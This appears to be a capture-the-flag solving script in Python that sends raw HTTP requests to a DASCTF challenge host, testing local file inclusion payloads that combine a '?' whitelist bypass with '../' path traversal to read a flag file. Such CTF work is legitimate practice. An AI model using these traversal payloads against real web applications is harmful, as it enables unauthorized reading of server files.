# -*- coding: utf-8 -*-
"""原始 socket 测试 LFI（保证 ? 字面传递）"""
import socket

host = '29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com'
port = 80


def raw_get(path):
    s = socket.create_connection((host, port), timeout=10)
    req = f'GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
    s.sendall(req.encode())
    resp = b''
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    return resp


tests = [
    ('/?file=source.php', '白名单直过'),
    ('/?file=source.php?x', '?截断测试'),
    ('/?file=source.php?/../../../../ffffllllaaaagggg.php', 'LFI 路径'),
    ('/?file=hint.php?/../../../../ffffllllaaaagggg.php', 'hint 前缀'),
    ('/?file=hint.php?./ffffllllaaaagggg.php', 'hint 相对路径'),
]

for path, label in tests:
    resp = raw_get(path)
    head, _, body = resp.partition(b'\r\n\r\n')
    first_line = head.split(b'\r\n')[0].decode(errors='ignore') if head else '(no header)'
    print(f'{label}:')
    print(f'  HTTP: {first_line}')
    print(f'  Body长度: {len(body)}')
    if b'DOCTYPE' in body:
        print(f'  结果: ❌ 完整页面（checkFile 失败）')
    elif len(body) > 0:
        print(f'  结果: ✅ 非完整页面！内容: {body[:150].decode(errors="ignore")}')
    else:
        print(f'  结果: ⚠️ 空 body（include 执行但文件不存在？）')
    print()
